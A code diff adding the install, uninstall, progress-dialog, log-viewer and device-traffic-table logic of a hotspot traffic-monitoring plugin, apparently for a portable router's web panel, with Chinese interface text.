+                const r = await run(`awk -v s=${readLines} 'NR>s' ${sq(hbFile)} 2>/dev/null`, 2000);
+                const content = String(r?.content || '').trim();
+                if (!content) {
+                    if (hadBeat) {
+                        const chk = await run(`[ -f ${sq(hbFile)} ] && echo 1`, 1000);
+                        if (!String(chk?.content || '').trim()) {
+                            clearInterval(poll); reject(htErr('后台进程异常终止')); return;
+                        }
+                    }
+                    return;
+                }
+                const lines = content.split('\n');
+                readLines += lines.length;
+                lastBeatTs = Date.now();
+                hadBeat = true;
+                for (const line of lines) {
+                    const parts = line.split('|');
+                    const step = parts[1], status = parts[2], detail = parts[3] || '';
+                    if (['running','done','warn'].includes(status)) progress(step, status, detail);
+                    if (status === 'failed') { progress(step, 'failed', detail); clearInterval(poll); const _e = htErr(detail || step); _e.htStep = step; reject(_e); return; }
+                    if (step === 'complete' && status === 'done') { clearInterval(poll); resolve(); return; }
+                }
+            }, 500);
+        });
+    };
+
+    const executeDeploy = async (deployBin, manifest, prevVer, progress) => {
+        await run(`rm -f ${sq(DATA_DIR + '/.deploy_heartbeat')}`);
+        const bestNode = await probeBestCdn();
+        const allNodes = [bestNode, ...CDN_MIRRORS.filter(m => m !== bestNode), CDN_ORIGIN].filter((v, i, a) => a.indexOf(v) === i);
+        const mirrors = allNodes.join(' ');
+        const cmd = [sq(deployBin), sq(manifest.version),
+            sq(manifest.guardUrl), sq(manifest.diagUrl),
+            sq(manifest.jsUrl), sq(manifest.md5),
+            sq(prevVer), sq(mirrors)].join(' ');
+        const proc = run(cmd, 120000);
+        await pollDeployHeartbeat(progress);
+        await proc;
+        await run(`rm -f ${sq(deployBin)}`);
+        await applyPluginJs(prevVer);
+    };
+
+    // ─── 启用/更新进度弹窗 ───
+    const DEPLOY_STEPS = [
+        { id: 'env',        label: '检查设备环境' },
+        { id: 'manifest',   label: '获取版本信息' },
+        { id: 'dl_deploy',  label: '下载部署脚本' },
+        { id: 'dl_guard',   label: '下载监控组件' },
+        { id: 'dl_diag',    label: '下载诊断组件' },
+        { id: 'dl_js',      label: '下载界面组件' },
+        { id: 'prepare_js', label: '准备界面更新' },
+        { id: 'deploy',     label: '部署文件' },
+        { id: 'restart',    label: '切换服务' },
+        { id: 'complete',   label: '完成' },
+    ];
+    const UPDATE_DEPLOY_STEPS = DEPLOY_STEPS.filter(s => s.id !== 'env');
+    const VERIFY_STEP = { id: 'verify', label: '校验完整性' };
+
+    const showFlowProgress = (title, steps, failPrefix = '启用失败') => {
+        document.querySelector('#ht_flow_progress')?.remove();
+        const st = {};
+        const stHint = {};
+        steps.forEach(s => { st[s.id] = 'pending'; stHint[s.id] = ''; });
+        let failInfo = null;
+        let finished = false;
+        const ICONS = {
+            pending: '<span style="color:#94a3b8;flex-shrink:0">○</span>',
+            running: '<span style="flex-shrink:0;display:inline-block;animation:ht_spin 1s linear infinite">⏳</span>',
+            done: '<span style="color:#86efac;flex-shrink:0">✓</span>',
+            warn: '<span style="color:#fbbf24;flex-shrink:0">!</span>',
+            failed: '<span style="color:#f87171;flex-shrink:0">✗</span>',
+        };
+        const renderBody = () => {
+            const doneN = steps.filter(s => st[s.id] === 'done').length;
+            const pct = finished ? 100 : Math.round(doneN / steps.length * 100);
+            const rows = steps.map(s => `<div style="display:flex;align-items:center;gap:8px;padding:3px 6px;border-radius:5px;font-size:.62rem;line-height:1.5;${st[s.id] === 'running' ? 'background:rgba(59,130,246,.15);' : ''}">${ICONS[st[s.id]] || ICONS.pending}<span>${esc(s.label)}${stHint[s.id] ? ' <span style="opacity:.6;font-size:.56rem">(' + esc(stHint[s.id]) + ')</span>' : ''}</span></div>`).join('');
+            let failHtml = '';
+            if (failInfo) {
+                failHtml = `
+                <div style="margin-top:8px;color:#f87171;font-size:.62rem;line-height:1.6">${esc(failPrefix)}：${esc(failInfo.userMsg)}</div>
+                <div style="margin-top:6px"><button id="ht_flow_detail_btn" style="font-size:.58rem">查看详细信息</button></div>
+                <div id="ht_flow_detail" style="display:none;margin-top:6px;font-family:monospace;font-size:.52rem;max-height:22vh;overflow-y:auto;word-break:break-all;background:rgba(0,0,0,.3);border-radius:6px;padding:8px">${failInfo.detailHtml}</div>
+                <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:10px"><button id="ht_flow_retry" style="font-size:.62rem;padding:5px 14px;border-radius:7px;border:1px solid rgba(34,197,94,.4);background:rgba(34,197,94,.25);color:#86efac;cursor:pointer;">重试</button><button id="ht_flow_close" style="font-size:.62rem;padding:5px 14px;border-radius:7px;border:1px solid rgba(255,255,255,.15);background:rgba(255,255,255,.06);color:inherit;cursor:pointer;">关闭</button></div>`;
+            }
+            return `
+                <div class="title" style="margin:0;display:flex;align-items:center;justify-content:space-between">${esc(title)}${qqBtnHtml('ht_flow_qq')}</div>
+                <div style="height:4px;background:rgba(255,255,255,.1);border-radius:2px;margin:8px 0;overflow:hidden"><div style="height:100%;width:${pct}%;background:#4ade80;border-radius:2px;transition:width .3s"></div></div>
+                <div>${rows}</div>${failHtml}`;
+        };
+        const { el, close } = createFixedToast('ht_flow_progress', `<div id="ht_flow_box" style="pointer-events:all;width:88vw;max-width:380px"></div>`);
+        const box = el.querySelector('#ht_flow_box');
+        const redraw = () => {
+            box.innerHTML = renderBody();
+            const qq = box.querySelector('#ht_flow_qq');
+            if (qq) qq.onclick = () => groupTip('群号已复制', 'green');
+            const db = box.querySelector('#ht_flow_detail_btn');
+            if (db) db.onclick = () => { const d = box.querySelector('#ht_flow_detail'); if (d) d.style.display = d.style.display === 'none' ? 'block' : 'none'; };
+            const rb = box.querySelector('#ht_flow_retry');
+            if (rb) rb.onclick = () => { close(); if (typeof failInfo?.onRetry === 'function') failInfo.onRetry(); };
+            const cb = box.querySelector('#ht_flow_close');
+            if (cb) cb.onclick = () => close();
+        };
+        redraw();
+        return {
+            setStep: (id, status, hint) => { if (st[id] !== undefined) { st[id] = status; stHint[id] = hint || ''; redraw(); } },
+            addStep: (afterId, stepDef) => { const idx = steps.findIndex(s => s.id === afterId); if (idx === -1) return; steps.splice(idx + 1, 0, stepDef); st[stepDef.id] = 'pending'; stHint[stepDef.id] = ''; redraw(); },
+            fail: (id, userMsg, detail, onRetry) => {
+                if (st[id] !== undefined) st[id] = 'failed';
+                const detailHtml = esc(new Date().toLocaleString() + ' | 插件版本: ' + (_PREV_VER || '初装') + '→' + (_manifest?.version || '?') + ' | 阶段: ' + id + ' | 详情: ' + (detail || '(无)') + ' | UA: ' + (navigator.userAgent || '').slice(0, 80) + ((navigator.userAgent || '').length > 80 ? '…' : ''));
+                failInfo = { userMsg, detailHtml, onRetry };
+                redraw();
+            },
+            done: () => {
+                steps.forEach(s => { if (st[s.id] !== 'warn') st[s.id] = 'done'; });
+                finished = true; failInfo = null; redraw();
+                setTimeout(close, 800);
+            },
+            close,
+        };
+    };
+
+    const install = async () => {
+        if (state._installing) return createToast('正在启用中，请稍候', 'yellow');
+        if (!(await checkAdvancedFunc())) return createToast('没有开启高级功能，无法使用！', 'red');
+        state._installing = true;
+        const flow = showFlowProgress('启用热点流量监控', DEPLOY_STEPS);
+        let curStep = 'env';
+        const at = (id) => { curStep = id; flow.setStep(id, 'running'); };
+        const ok = (id) => flow.setStep(id, 'done');
+        try {
+            at('env');
+            const probeR = await run(`iptables -w 5 -L FORWARD -n 2>&1 && echo __OK__`, 8000);
+            if (!String(probeR?.content || '').includes('__OK__'))
+                throw htErr('设备网络组件检查未通过', String(probeR?.content || '').trim().slice(0, 200));
+            ok('env');
+
+            at('manifest');
+            let rawManifest = await fetchManifestAllNodes(
+                _PREV_VER ? 'v' + _PREV_VER + '.json' : 'latest.json'
+            );
+            if (!rawManifest && _PREV_VER) {
+                flow.setStep('manifest', 'running', '兜底源');
+                rawManifest = await fetchManifestAllNodes('latest.json');
+            }
+            if (!rawManifest) throw htErr('无法获取版本信息，请检查网络后重试', _lastManifestErr);
+            _manifest = parseManifest(rawManifest);
+            if (!_manifest) throw htErr('版本信息格式异常');
+            ok('manifest');
+            if (_manifest.md5) flow.addStep('dl_js', VERIFY_STEP);
+
+            await cleanResidue();
+            await run(`mkdir -p ${sq(DATA_DIR)}`);
+
+            at('dl_deploy');
+            const deployBin = await downloadDeployScript(
+                _manifest.deployUrl,
+                (id, st, hint) => flow.setStep(id, st, hint)
+            );
+            ok('dl_deploy');
+
+            curStep = 'deploy';
+            await executeDeploy(deployBin, _manifest, _PREV_VER || '', (step, status, detail) => {
+                flow.setStep(step, status, detail);
+            });
+
+            await run(`grep -qxF ${sq(BOOT_LINE)} ${sq(BOOT_SH_FILE)} || echo ${sq(BOOT_LINE)} >> ${sq(BOOT_SH_FILE)}`);
+
+            state.installed = true;
+            state._deviceVersion = _manifest.version;
+            flow.done();
+            createToast('已启用 v' + _manifest.version + '，2秒后刷新', 'green');
+            setTimeout(() => location.reload(), 2000);
+        } catch (e) {
+            flow.fail(e?.htStep || curStep, e?.message || String(e), (e?.htDetail || '') + (e?.htAttempts ? ' | 已重试' + e.htAttempts + '次' : ''), startInstallFlow);
+        } finally { state._installing = false; }
+    };
+
+    const startInstallFlow = async () => {
+        await install();
+        if (state.installed) await loadData();
+        renderIntoPanel();
+        if (state.installed) setAutoData(true);
+    };
+
+    const uninstall = async () => {
+        if (state._uninstalling) return createToast('正在卸载中，请稍候', 'yellow');
+        if (!(await checkAdvancedFunc())) return createToast('没有开启高级功能，无法使用！', 'red');
+        state._uninstalling = true;
+        setAutoData(false);
+        _dataEvtBound = false;
+        try {
+            await run(`
+sed -i '/${NAME}/d' ${sq(BOOT_SH_FILE)} 2>/dev/null
+_p=$(awk '{print}' ${sq(PID_FILE)} 2>/dev/null)
+if [ -n "$_p" ]; then
+kill -15 "$_p" 2>/dev/null
+_i=0; while kill -0 "$_p" 2>/dev/null && [ "$_i" -lt 15 ]; do sleep 0.1; _i=$((_i+1)); done
+_ep=$(awk '{print}' ${sq(DATA_DIR + '/.engine_pid')} 2>/dev/null)
+[ -n "$_ep" ] && kill -9 "$_ep" 2>/dev/null
+_tp=$(awk '{print}' ${sq(DATA_DIR + '/.tcpdump_pid')} 2>/dev/null)
+[ -n "$_tp" ] && kill -9 "$_tp" 2>/dev/null
+kill -9 "$_p" 2>/dev/null
+fi
+rm -f ${sq(PID_FILE)} ${sq(DATA_DIR + '/.engine_pid')} ${sq(DATA_DIR + '/.tcpdump_pid')}
+rm -rf ${sq(DATA_DIR + '/.lock_dir')}
+rm -f ${sq(TRAFFIC_BIN_FILE)} ${sq(DIAG_BIN_FILE)} ${sq(LOG_FILE)} ${TRAFFIC_PROC} ${DIAG_PROC} ${sq(WEBHOOK_FILE)} ${sq(TRAFFIC_BIN_FILE + '.b64')} ${sq(DIAG_BIN_FILE + '.b64')} ${sq(PENDING_JS_FILE)}
+rm -rf ${sq(DATA_DIR)}
+`, 10000);
+            state.installed = false; state.dataCache = null; state.lastUpdated = ''; state.summary = null;
+            clearDiagState();
+            createToast('热点流量监控已停用');
+        } catch (e) {
+            createToast('停用失败：' + (e && e.message ? e.message : String(e)), 'red');
+        }
+        state._uninstalling = false;
+    };
+
+    const showUninstallConfirm = () => {
+        document.querySelector('#ht_uninstall_confirm')?.remove();
+        let clicks = 0;
+        const { el, close } = createFixedToast('ht_uninstall_confirm', `
+            <div style="pointer-events:all;width:80vw;max-width:300px">
+                <div class="title" style="margin:0;display:flex;align-items:center;justify-content:space-between">停用插件${qqBtnHtml('ht_uninstall_qq')}</div>
+                <div style="margin:10px 0;font-size:.64rem;line-height:1.6">停用后，流量统计数据将被清除，且无法找回。是否继续？</div>
+                <div style="display:flex;gap:6px;justify-content:flex-end"><button style="font-size:.62rem" id="ht_uninstall_confirm_confirm">确认</button><button style="font-size:.62rem" id="ht_uninstall_confirm_close">取消</button></div>
+            </div>`);
+        el.querySelector('#ht_uninstall_qq').onclick = () => groupTip('群号已复制', 'green');
+        const onClose = () => true;
+        const onConfirm = async () => {
+            clicks++;
+            if (clicks < 3) {
+                const remain = 3 - clicks;
+                const btn = el.querySelector('#ht_uninstall_confirm_confirm');
+                if (btn) btn.textContent = `确认(再点${remain}次)`;
+                createToast(`再点 ${remain} 次即可停用`, 'pink', 1500);
+                return false;
+            }
+            const btn = el.querySelector('#ht_uninstall_confirm_confirm');
+            if (btn) btn.disabled = true;
+            close();
+            const { close: closeLoading } = createFixedToast('ht_uninstall_loading', '正在停用...');
+            try {
+                await uninstall();
+                renderIntoPanel();
+            } finally { closeLoading(); }
+            return false;
+        };
+        el.querySelector('#ht_uninstall_confirm_confirm').onclick = async () => { if (await onConfirm()) close(); };
+        el.querySelector('#ht_uninstall_confirm_close').onclick = () => { if (onClose()) close(); };
+    };
+
+    // ─── data ─────────────────────────────────────────────────────────────────
+    const loadData = async (preloaded) => {
+        if (preloaded && preloaded.devices && typeof preloaded.devices === 'object') {
+            state.dataCache = preloaded;
+            state.lastUpdated = preloaded.updatedAt || '';
+            state.summary = preloaded.summary || null;
+            return;
+        }
+        try {
+            const result = await run(`[ -f ${sq(DATA_FILE)} ] && timeout 3s awk '{print}' ${sq(DATA_FILE)} 2>/dev/null || echo '{}'`, 5000);
+            const raw = String(result?.content ?? '').trim();
+            if (!raw || !raw.startsWith('{')) return;
+
+            const parsed = JSON.parse(raw);
+            if (!parsed || typeof parsed.devices !== 'object' || !parsed.summary) {
+                console.warn('[HT] data.json 结构不完整，跳过本轮');
+                return;
+            }
+            state.dataCache = parsed;
+            state.lastUpdated = parsed.updatedAt || '';
+            state.summary = parsed.summary || null;
+
+            if (!state._clientIp) {
+                try {
+                    const ufi = await getUFIData();
+                    if (ufi?.client_ip) state._clientIp = ufi.client_ip;
+                } catch {}
+            }
+        } catch (e) { console.warn('[HT] loadData:', e); }
+    };
+
+    let dataLoading = false;
+    const refreshDataArea = async (preloaded) => {
+        const area = document.querySelector(`#${MODAL} #ht_data_area`);
+        if (!area) return;
+        if (area.querySelector('[data-ht]')) {
+            await patchDataArea(preloaded);
+            return;
+        }
+        if (dataLoading) return;
+        dataLoading = true;
+        try {
+            await loadData(preloaded);
+            area.innerHTML = renderDataArea();
+            initDataDelegate();
+        } finally { dataLoading = false; }
+    };
+
+    const patchDataArea = async (preloaded) => {
+        if (dataLoading) return;
+        dataLoading = true;
+        try {
+            await loadData(preloaded);
+            const el = document.querySelector(`#${MODAL} #ht_data_area`);
+            if (!el || !state.dataCache) return;
+
+            const devicesMap = state.dataCache.devices || {};
+            const deviceList = sortDevices(devicesMap);
+            const summary = state.summary;
+
+            if (summary) {
+                const m = calcSummaryMetrics(summary, deviceList);
+                summaryHtmls(m).forEach((html, i) => { const n = el.querySelector(`[data-ht="si_${i}"]`); if (n && n.innerHTML !== html) n.innerHTML = html; });
+            }
+
+            const tbody = el.querySelector('tbody');
+            if (!tbody) {
+                if (deviceList.length > 0) { el.innerHTML = renderDataArea(); initDataDelegate(); }
+                return;
+            }
+
+            if (tbody.querySelector('tr') && (!tbody.querySelector('[data-ht="tf"]') || !tbody.querySelector('td:nth-child(2) > [data-edit-mac]') || !tbody.querySelector('td:nth-child(4)'))) {
+                tbody.innerHTML = deviceList.map((d, i) => renderDeviceRow(d, i)).join('');
+            }
+
+            const domMacs = [];
+            tbody.querySelectorAll('tr[data-mac]').forEach(tr => domMacs.push(tr.dataset.mac));
+            const newMacs = deviceList.map(d => d.mac);
+            const orderChanged = domMacs.length !== newMacs.length || domMacs.some((m, i) => m !== newMacs[i]);
+
+            if (orderChanged) {
+                tbody.innerHTML = deviceList.map((d, i) => renderDeviceRow(d, i)).join('');
+            } else {
+                deviceList.forEach((device, index) => {
+                    const tr = tbody.querySelector(`tr[data-mac="${esc(device.mac)}"]`);
+                    if (!tr) return;
+                    const displayName = resolveDisplayName(device);
+                    const txBytes = device.txBytes || 0;
+                    const rxBytes = device.rxBytes || 0;
+                    const totalBytes = txBytes + rxBytes;
+                    const p = (attr, val) => { const n = tr.querySelector(`[data-ht="${attr}"]`); if (n && n.textContent !== val) n.textContent = val; };
+                    p('idx', String(index + 1));
+                    const isMe = device.ip && device.ip === state._clientIp;
+                    const meTag = isMe ? '<span style="color:#999;font-size:.55rem"> (我)</span>' : '';
+                    const nameHtml = `${esc(displayName)}${meTag}`;
+                    const nameEl = tr.querySelector('[data-ht="name"]');
+                    if (nameEl && nameEl.innerHTML !== nameHtml) nameEl.innerHTML = nameHtml;
+                    p('ip', device.ip || '');
+                    const tfEl = tr.querySelector('[data-ht="tf"]');
+                    const tfHtml = renderTrafficRateCell(device, totalBytes, txBytes, rxBytes);
+                    if (tfEl && tfEl.innerHTML !== tfHtml) tfEl.innerHTML = tfHtml;
+                    const polEl = tr.querySelector('[data-ht="pol"]');
+                    if (polEl) {
+                        const pol = state.policyMap[device.mac];
+                        const wantBg = pol?.type === 'blacklist' ? '#f87171' : '';
+                        if (polEl.style.background !== wantBg) {
+                            polEl.style.display = pol ? 'inline-block' : 'none';
+                            polEl.style.background = wantBg;
+                        }
+                    }
+                    const dot = tr.querySelector('[data-ht="dot"]');
+                    if (dot) { const txt = device.online ? '🟢' : '⚫'; if (dot.textContent !== txt) dot.textContent = txt; }
+                });
+            }
+
+            const updatedShort = state.lastUpdated ? state.lastUpdated.slice(11, 19) : '';
+            const dateEl = el.querySelector('[data-ht="sum_date"]');
+            if (dateEl) { const txt = updatedShort ? `（更新时间 ${updatedShort}）` : ''; if (dateEl.textContent !== txt) dateEl.textContent = txt; }
+
+        } finally { dataLoading = false; }
+    };
+
+    // ─── log popup ────────────────────────────────────────────────────────────
+    const copyToClipboard = async (text) => {
+        try {
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                await navigator.clipboard.writeText(text); return true;
+            }
+        } catch {}
+        try {
+            const ta = document.createElement('textarea');
+            ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
+            document.body.appendChild(ta); ta.select();
+            const ok = document.execCommand('copy');
+            document.body.removeChild(ta);
+            return ok;
+        } catch { return false; }
+    };
+
+    const groupTip = async (msg, color, ms) => { await copyToClipboard(QQ_GROUP); return createToast(msg, color, ms); };
+    const qqBtnHtml = (id) => `<span id="${id}" title="点击复制群号" style="font-size:.72rem;font-weight:700;cursor:pointer;margin-left:auto;color:#bae6fd;background:rgba(56,189,248,.18);border:1px solid rgba(56,189,248,.45);border-radius:8px;padding:3px 10px;line-height:1.4;white-space:nowrap;letter-spacing:.3px;">反馈群:${QQ_GROUP}</span>`;
+
+    const showLogPopup = async () => {
+        const fetchLog = async () => {
+            const r = await run(`[ -f ${sq(LOG_FILE)} ] && timeout 2s tail -80 ${sq(LOG_FILE)} || echo "(暂无日志)"`, 5000);
+            return String(r?.content ?? '').trim();
+        };
+        const logText = await fetchLog();
+        const { el: toastEl, close } = createFixedToast('ht_log_toast', `<div style="pointer-events:all;width:90vw;max-width:420px"><div class="title" style="margin:0 0 6px;display:flex;align-items:center;justify-content:space-between">运行日志${qqBtnHtml('ht_log_qq')}</div><textarea id="ht_log_area" readonly style="width:100%;height:40vh;font-size:.56rem;line-height:1.5;background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.1);border-radius:6px;padding:6px;color:inherit;resize:none;"></textarea><div style="display:flex;gap:6px;justify-content:flex-end;margin-top:6px"><button id="ht_log_refresh" style="font-size:.6rem">刷新</button><button id="ht_log_copy" style="font-size:.6rem">复制</button><button id="ht_log_close" style="font-size:.6rem">关闭</button></div></div>`);
+        const area = toastEl.querySelector('#ht_log_area');
+        area.value = logText; area.scrollTop = area.scrollHeight;
+        toastEl.querySelector('#ht_log_qq').onclick = () => groupTip('群号已复制', 'green');
+        toastEl.querySelector('#ht_log_refresh').onclick = async () => { area.value = await fetchLog(); area.scrollTop = area.scrollHeight; };
+        toastEl.querySelector('#ht_log_copy').onclick = async () => { await copyToClipboard(area.value); createToast('日志已复制', 'green'); };
+        toastEl.querySelector('#ht_log_close').onclick = () => close();
+    };
+
+    const stopAutoData = () => { if (state.autoDataTimer) clearInterval(state.autoDataTimer); state.autoDataTimer = null; };
+    const setAutoData = (enabled) => {
+        state.autoData = Boolean(enabled && state.installed);
+        stopAutoData();
+        if (state.autoData) {
+            state.autoDataTimer = setInterval(async () => {
+                if (document.querySelector('#collapse_ht')?.dataset?.name !== 'open' || !state.installed || !state.autoData) { setAutoData(false); return; }
+                const r = await run(`_mt=$(stat -c %Y ${sq(DATA_FILE)} 2>/dev/null || echo 0)
+echo "$_mt"
+if [ "$_mt" != ${sq(state._lastMtimeKey || '0')} ]; then timeout 2s awk '{print}' ${sq(DATA_FILE)} 2>/dev/null; fi`, 5000);
+                const raw = String(r?.content || '');
+                const nl = raw.indexOf('\n');
+                const mtKey = (nl >= 0 ? raw.slice(0, nl) : raw).trim();
+                const body = nl >= 0 ? raw.slice(nl + 1).trim() : '';
+                if (mtKey === state._lastMtimeKey && state.dataCache) return;
+                state._lastMtimeKey = mtKey;
+                if (body) {
+                    try { refreshDataArea(JSON.parse(body)); return; } catch (e) { console.warn('[HT] poll parse:', e); }
+                }
+                refreshDataArea();
+            }, 5000);
+        }
+    };
+
+    // ─── style ────────────────────────────────────────────────────────────────
+    const ensureStyle = () => {
+        let s = document.getElementById(STYLE);
+        if (!s) {
+            s = document.createElement('style');
+            s.id = STYLE;
+            document.head.appendChild(s);
+        }
+        s.textContent = `
+      #${MODAL} .ht-wrap{display:flex;flex-direction:column;gap:6px;font-size:.85rem;position:relative;width:100%;}
+      #${MODAL} .ht-card{position:relative;overflow:hidden;border:1px solid rgba(139,92,246,0.25);background:linear-gradient(135deg,rgba(99,102,241,0.15) 0%,rgba(139,92,246,0.1) 50%,rgba(168,85,247,0.06) 100%);border-radius:16px;padding:12px 14px;box-shadow:0 4px 16px rgba(99,102,241,0.08);}
+      #${MODAL} .ht-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,rgba(139,92,246,0.6),rgba(168,85,247,0.4),transparent);pointer-events:none;}
+      #${MODAL} .ht-wrap>.ht-card:first-child{padding:10px 14px;}
+      #${MODAL} #ht_data_area{display:flex;flex-direction:column;gap:6px;}
+      #${MODAL} .ht-row{display:flex;align-items:center;gap:8px;}
+      #${MODAL} .ht-btn{border-radius:10px;padding:7px 14px;font-size:.75rem;cursor:pointer;border:1px solid rgba(139,92,246,0.3);background:rgba(99,102,241,0.18);color:inherit;transition:all .2s ease;font-weight:600;}
+      #${MODAL} .ht-btn:hover{background:rgba(99,102,241,0.3);transform:translateY(-1px);box-shadow:0 2px 8px rgba(99,102,241,0.15);}
+      #${MODAL} .ht-btn:active{transform:scale(.97);}
+      #${MODAL} .ht-btn:disabled{opacity:.3;cursor:not-allowed;transform:none;}
+      #${MODAL} .ht-btn-success{background:rgba(16,185,129,0.25);border-color:rgba(16,185,129,0.4);color:#34d399;font-size:.78rem;padding:7px 18px;}
+      #${MODAL} .ht-btn-success:hover{background:rgba(16,185,129,0.35);box-shadow:0 2px 8px rgba(16,185,129,0.2);}
+      #${MODAL} .ht-btn-stop{background:rgba(244,63,94,0.25);border-color:rgba(244,63,94,0.4);color:#fb7185;font-size:.78rem;padding:7px 18px;}
+      #${MODAL} .ht-btn-stop:hover{background:rgba(244,63,94,0.35);box-shadow:0 2px 8px rgba(244,63,94,0.2);}
+      #${MODAL} .ht-btn-ghost{background:transparent;border-color:rgba(139,92,246,0.2);opacity:.85;}
+      #${MODAL} .ht-btn-ghost:hover{opacity:1;background:rgba(99,102,241,0.12);}
+      #${MODAL} .ht-dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:4px;vertical-align:middle;}
+      #${MODAL} .ht-dot-green{background:#34d399;box-shadow:0 0 8px rgba(52,211,153,0.7);}
+      #${MODAL} .ht-dot-gray{background:rgba(255,255,255,.25);}
+      #${MODAL} .ht-tbl-wrap{overflow-x:auto;-webkit-overflow-scrolling:touch;border-radius:10px;}
+      #${MODAL} .ht-tbl{width:100%;table-layout:auto;border-collapse:collapse;font-size:.75rem;}
+      #${MODAL} .ht-tbl th{font-size:.68rem;opacity:.7;font-weight:700;text-align:left;padding:8px 6px;border-bottom:2px solid rgba(139,92,246,0.2);white-space:nowrap;background:rgba(99,102,241,0.1);}
+      #${MODAL} .ht-tbl td{padding:6px 6px;border-bottom:1px solid rgba(139,92,246,0.08);vertical-align:middle;}
+      #${MODAL} .ht-tbl th:first-child,#${MODAL} .ht-tbl td:first-child{padding-left:4px;}
+      #${MODAL} .ht-tbl th:last-child,#${MODAL} .ht-tbl td:last-child{padding-right:4px;}
+      #${MODAL} .ht-tbl tr:last-child td{border-bottom:none;}
+      #${MODAL} .ht-tbl tbody tr:hover td{background:rgba(139,92,246,0.12);}
+      #${MODAL} .ht-tbl .ht-td-name{font-weight:700;display:flex;align-items:center;gap:4px;line-height:1.3;font-size:.78rem;}
+      #${MODAL} .ht-tbl .ht-td-meta{font-size:.66rem;opacity:.5;line-height:1.4;word-break:break-all;margin-top:2px;}
+      #${MODAL} .ht-tbl .ht-td-num{font-weight:700;white-space:nowrap;font-size:.72rem;font-variant-numeric:tabular-nums;}
+      #${MODAL} .ht-rate-seg{display:inline;}
+      #${MODAL} .ht-mac{cursor:pointer;border-bottom:1px dashed rgba(139,92,246,0.4);}
+      #${MODAL} .ht-mac:hover{opacity:.85;}
+      #${MODAL} .ht-edit-mini{background:rgba(99,102,241,0.2);border:1px solid rgba(139,92,246,0.25);cursor:pointer;opacity:1;font-size:.72rem;padding:6px 8px;color:#c4b5fd;line-height:1;flex-shrink:0;border-radius:8px;transition:all .15s;}
+      #${MODAL} .ht-edit-mini:hover{background:rgba(99,102,241,0.35);color:#fff;box-shadow:0 2px 6px rgba(99,102,241,0.2);}
+      #ht_dev_name::placeholder{color:#475569;opacity:1;}
+      #${MODAL} .ht-up{color:#a78bfa;font-weight:600;}
+      #${MODAL} .ht-down{color:#34d399;font-weight:600;}
+      #${MODAL} .ht-total{color:rgba(255,255,255,.75);font-weight:600;}
+      #${MODAL} .ht-summary-item .ht-up,#${MODAL} .ht-summary-item .ht-down{color:inherit;}
+      #${MODAL} .ht-muted{color:rgba(255,255,255,.35);}
+      #${MODAL} .ht-status-ok{color:#34d399;}
+      #${MODAL} .ht-status-warn{color:#fbbf24;}
+      #${MODAL} .ht-status-alert{color:#fb7185;}
+      #${MODAL} .ht-status-info{color:#9ca3af;}
+      #${MODAL} .ht-empty{padding:16px;border:1px dashed rgba(139,92,246,0.2);border-radius:12px;opacity:.55;text-align:center;font-size:.72rem;}
+      @keyframes ht_spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
+      #${MODAL} .ht-updated{font-size:.66rem;opacity:.4;margin-left:auto;}
+      #${MODAL} .ht-date{font-size:.68rem;opacity:.65;margin-left:8px;color:#c4b5fd;font-weight:500;}
+      #${MODAL} .ht-summary-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:8px;}
+      #${MODAL} .ht-summary-item{background:rgba(99,102,241,0.1);border-radius:12px;border:1px solid rgba(139,92,246,0.15);padding:10px 12px;transition:all .2s;position:relative;overflow:hidden;}
+      #${MODAL} .ht-summary-item::before{content:'';position:absolute;top:0;left:0;width:3px;height:100%;background:linear-gradient(180deg,rgba(139,92,246,0.5),rgba(168,85,247,0.2));}
+      #${MODAL} .ht-summary-item:hover{background:rgba(99,102,241,0.15);transform:translateY(-1px);}
+      #${MODAL} .ht-summary-val{font-size:.92rem;font-weight:800;margin-bottom:2px;line-height:1.2;}
+      #${MODAL} .ht-summary-lbl{font-size:.66rem;opacity:.6;line-height:1.3;}
+      #${MODAL} .ht-diag-item{padding:5px 0;border-bottom:1px solid rgba(139,92,246,0.08);font-size:.7rem;line-height:1.4;word-break:break-all;}
+      #${MODAL} .collapse_box{padding:0 0 4px;}
+      @media(max-width:380px){#${MODAL} .ht-wrap{font-size:.78rem;gap:4px;} #${MODAL} .ht-card{padding:10px 10px;} #${MODAL} .ht-summary-val{font-size:.82rem;} #${MODAL} .ht-tbl{font-size:.7rem;} #${MODAL} .ht-btn{padding:5px 10px;font-size:.7rem;}}
+      @media(max-width:480px){#${MODAL} .ht-rate-seg{display:block;margin-top:2px;} #${MODAL} .ht-tbl td.ht-total{white-space:normal;}}
+    `;
+    };
+
+    // ─── render ───────────────────────────────────────────────────────────────
+    const renderDeviceRow = (device, index) => {
+        const displayName = resolveDisplayName(device);
+        const txBytes = device.txBytes || 0;
+        const rxBytes = device.rxBytes || 0;
+        const totalBytes = txBytes + rxBytes;
+        const safeMac = esc(device.mac || '');
+        const online = device.online;
+        const dotCls = online ? 'ht-dot-green' : 'ht-dot-gray';
+        const isMe = device.ip && device.ip === state._clientIp;
+        const meTag = isMe ? '<span style="color:#999;font-size:.55rem"> (我)</span>' : '';
+        const pol = state.policyMap[device.mac];
+        const polBg = pol?.type === 'blacklist' ? '#f87171' : '';
+        const polDot = `<span data-ht="pol" style="display:${pol ? 'inline-block' : 'none'};width:6px;height:6px;border-radius:50%;margin-right:3px;vertical-align:middle;opacity:.7${polBg ? ';background:' + polBg : ''}"></span>`;
+        return `<tr data-mac="${safeMac}">
+        <td style="opacity:.4;font-size:.54rem;width:10px;text-align:center;" data-ht="idx">${index + 1}</td>
+        <td><button class="ht-edit-mini" data-edit-mac="${safeMac}" title="自定义名称">⚙</button></td>
+        <td>
+          <div class="ht-td-name">
+            <span data-ht="dot" style="font-size:.7rem;line-height:1;">${online ? '🟢' : '⚫'}</span>
+            ${polDot}<span data-ht="name">${esc(displayName)}${meTag}</span>
+          </div>
+          <div class="ht-td-meta"><span data-ht="ip">${esc(device.ip || '')}</span> | <span class="ht-mac" data-full-mac="${safeMac}" data-masked="1" title="点击查看完整 MAC">${esc(maskMac(device.mac || ''))}</span></div>
+        </td>
